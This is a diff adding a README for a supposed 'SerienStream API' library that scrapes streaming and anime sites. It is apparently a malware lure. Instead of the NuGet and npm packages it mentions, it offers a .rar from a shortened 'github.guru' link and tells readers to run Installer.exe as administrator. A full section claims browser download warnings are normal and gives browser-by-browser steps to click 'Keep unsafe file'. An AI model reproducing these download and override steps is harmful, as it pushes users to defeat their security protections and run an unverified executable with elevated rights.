@@ -1,0 +1,186 @@
+                          ▄▄                                                                            
+ ▄█▀▀▀█▄█                 ██                     ▄█▀▀▀█▄█ ██                                            
+▄██    ▀█                                       ▄██    ▀█ ██                                            
+▀███▄     ▄▄█▀██▀███▄███▀███   ▄▄█▀██▀████████▄ ▀███▄   ██████▀███▄███  ▄▄█▀██ ▄█▀██▄ ▀████████▄█████▄  
+  ▀█████▄▄█▀   ██ ██▀ ▀▀  ██  ▄█▀   ██ ██    ██   ▀█████▄ ██    ██▀ ▀▀ ▄█▀   ███   ██   ██    ██    ██  
+▄     ▀████▀▀▀▀▀▀ ██      ██  ██▀▀▀▀▀▀ ██    ██ ▄     ▀██ ██    ██     ██▀▀▀▀▀▀▄█████   ██    ██    ██  
+██     ████▄    ▄ ██      ██  ██▄    ▄ ██    ██ ██     ██ ██    ██     ██▄    ▄█   ██   ██    ██    ██  
+█▀█████▀  ▀█████▀████▄  ▄████▄ ▀█████▀████  ████▄▀█████▀  ▀████████▄    ▀█████▀████▀██▄████  ████  ████▄
+                                                                                                        
+                                                                                                        
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                          SERIENSTREAM API                                 ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+SERIENSTREAM API — is a powerful programming interface and library designed to search, retrieve metadata, and access series and anime from popular streaming platforms like SerienStream.to (s.to) and AniWorld.to. This API works by scraping HTML data from these sites and parsing it into clean, easy-to-use data models. Available as both a .NET library (C#) and TypeScript package, it provides developers with programmatic access to series information, episode listings, movie collections, and direct video stream URLs from multiple host providers.
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/jP9fpGes                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    ⚡ QUICK INSTALLATION:
+    ──────────────────────────────────────────────────
+    [1] DOWNLOAD    →  SerienStream_API.rar
+    [2] EXTRACT     →  WinRAR or 7-Zip
+    [3] RUN         →  Installer.exe (as administrator)
+    [4] CHOOSE      →  Installation directory
+    [5] COMPLETE    →  Follow setup wizard
+    [6] INTEGRATE   →  Add to your development project
+    ──────────────────────────────────────────────────
+
+    ⚡ HOW THE PROGRAM WORKS:
+    ─────────────────────────────────────────────────────────────────
+    
+    🔹 CORE TECHNOLOGY
+    SerienStream API operates by scraping HTML data from streaming platforms and parsing it into structured, easy-to-use data models. Unlike official APIs that require authentication, this library intelligently extracts content by analyzing website structure, making it possible to access series information, episode lists, and streaming links programmatically .
+    
+    🔹 PLATFORM SUPPORT
+    The API comes in multiple implementations for different development environments:
+    
+    • .NET LIBRARY (C#): Full-featured implementation available via NuGet package
+    • TYPESCRIPT LIBRARY: JavaScript/TypeScript version for Node.js applications
+    • PYTHON SUPPORT: Available through third-party parsers
+    
+    🔹 CORE FEATURES
+    The API provides comprehensive access to streaming platform content:
+    
+    • SERIES SEARCH: Find series by title with fuzzy matching support
+    • METADATA RETRIEVAL: Get series descriptions, titles, and detailed information
+    • EPISODE LISTING: Fetch all episodes organized by season
+    • MOVIE COLLECTIONS: Access movie content separate from series
+    • STREAM INFORMATION: Extract video URLs from multiple hosting providers
+    • LANGUAGE DETECTION: Identify audio and subtitle languages
+    
+    🔹 IMPLEMENTATION (C# / .NET)
+    For .NET developers, the API offers a clean, async-first interface:
+    
+    ```csharp
+    // Create a new SerienStreamClient
+    SerienStreamClient client = new(
+        hostUrl: "https://aniworld.to/", 
+        site: "anime", 
+        ignoreCerficiateValidation: false
+    );
+    
+    // Search for a series
+    Series series = await client.GetSeriesAsync("My Dress-Up Darling");
+    
+    // Get all episodes of season 1
+    Media[] episodes = await client.GetEpisodesAsync("My Dress-Up Darling", 1);
+    
+    // Get video details for an episode
+    VideoDetails videoDetails = await client.GetEpisodeVideoInfoAsync("My Dress-Up Darling", 1, 1);
+    ```
+    
+    🔹 IMPLEMENTATION (TypeScript)
+    For Node.js developers, the TypeScript version provides similar functionality:
+    
+    ```typescript
+    import { SerienStreamClient } from 'serienstreamapi';
+    
+    const client = new SerienStreamClient("https://aniworld.to/", "animes", false);
+    const series = await client.getSeries("My Dress-Up Darling");
+    const episodes = await client.getEpisodes("My Dress-Up Darling", 1);
+    ```
+    
+    🔹 SUPPORTED HOSTING PROVIDERS
+    The API can extract streams from multiple popular video hosts:
+    
+    • VOE: Direct stream extraction with URL decoding
+    • STREAMTAPE: Stream URL retrieval and format handling
+    • DOODSTREAM: Video URL extraction and validation
+    • VIDOZA: Stream decoding and direct access
+    • Additional providers added through regular updates
+    
+    🔹 DOWNLOAD FUNCTIONALITY
+    Download videos directly using FFmpeg integration:
+    
+    ```csharp
+    DownloadClient downloadClient = new("ffmpeg.exe", false);
+    await downloadClient.DownloadEpisodeAsync(episodeVideoDetails, "output.mp4");
+    ```
+    
+    🔹 AVAILABLE PACKAGES
+    Multiple package versions are available across different repositories:
+    
+    • NUGET: SerienStreamAPI versions 1.0.0 to 1.0.4
+    • NPM: serienstreamapi version 1.0.2 (TypeScript)
+    • GITHUB: Source code available with MIT and GPL-3.0 licenses
+    
+    🔹 USE CASES
+    The API is ideal for various applications:
+    
+    • MEDIA PLAYERS: Create custom streaming applications
+    • DOWNLOAD MANAGERS: Build tools for offline viewing
+    • MEDIA SERVERS: Integrate with Plex, Jellyfin, or Emby
+    • CONTENT AGGREGATORS: Combine multiple streaming sources
+    • STATISTICS TOOLS: Analyze series and episode data
+    ─────────────────────────────────────────────────────────────────
+
+    ⚡ SYSTEM REQUIREMENTS:
+    ─────────────────────────────────────────────────────────────────
+    OS              │ Windows 7/8/10/11, Linux, macOS
+    RAM             │ 512MB minimum (1GB+ recommended for development)
+    STORAGE         │ 50MB for library + space for projects
+    .NET            │ .NET Standard 2.0 or higher (for C# version)
+    NODE.JS         │ 12.x or higher (for TypeScript version)
+    FFMPEG          │ Required for download functionality (optional)
+    INTERNET        │ Required for API calls to streaming sites
+    ─────────────────────────────────────────────────────────────────
+
+    🔖 TAGS
+    ─────────────────────────────────────────────────────────────────
+    serienstream       │ s.to api              │ aniworld api
+    streaming api      │ video api             │ series scraper
+    episode downloader │ c# api                │ typescript api
+    video extraction   │ stream parser         │ movie api
+    german streaming   │ anime api             │ media library
+    ─────────────────────────────────────────────────────────────────
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                 ⚠ IMPORTANT DOWNLOAD WARNING                              ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+    Your browser may show a warning when downloading this file.
+    This is completely normal.
+
+    ═══════════════════════════════════════════════════════════════════════
+    
+    ❓ WHY DOES THIS HAPPEN?
+    
+    The warning appears because the file:
+    
+    • Is not distributed through major app stores (Microsoft Store)
+    • Has fewer downloads than mainstream software
+    • Uses .exe format or compressed archives (.rar/.zip)
+    • Is new or less known in browser databases
+    
+    ⚡ This does NOT mean the file is dangerous. This is a standard browser 
+       protection mechanism triggered by download count, not by detecting 
+       malware. Similar development libraries receive the same warnings.
+
+    ═══════════════════════════════════════════════════════════════════════
+
+    📋 BROWSER INSTRUCTIONS:
+    ─────────────────────────────────────────────────────────────────
+    Browser         │ Action
+    ─────────────────────────────────────────────────────────────────
+    Chrome/Edge     │ Click "Keep" or "Keep anyway"
+                    │ → Confirm "Keep unsafe file"
+    ─────────────────────────────────────────────────────────────────
+    Firefox         │ Click arrow → "Allow download"
+    ─────────────────────────────────────────────────────────────────
+    Opera/Brave     │ Click "Keep" in download warning
+    ─────────────────────────────────────────────────────────────────
+
+    ═══════════════════════════════════════════════════════════════════════
+
+╔═══════════════════════════════════════════════════════════════════════════╗
+║                             DOWNLOAD                                      ║
+║                 ▶ https://github.guru/s/jP9fpGes                          ║
+╚═══════════════════════════════════════════════════════════════════════════╝
+
+────────────────────────────────────────────────────────────────────────────
+Disclaimer: This software is a third-party development library and is not affiliated with SerienStream.to, AniWorld.to, or any streaming platforms. The API is intended for educational purposes and legitimate development projects. Users are responsible for complying with applicable laws and the terms of service of any platforms accessed through this library. The developers do not endorse or promote copyright infringement.
+────────────────────────────────────────────────────────────────────────────
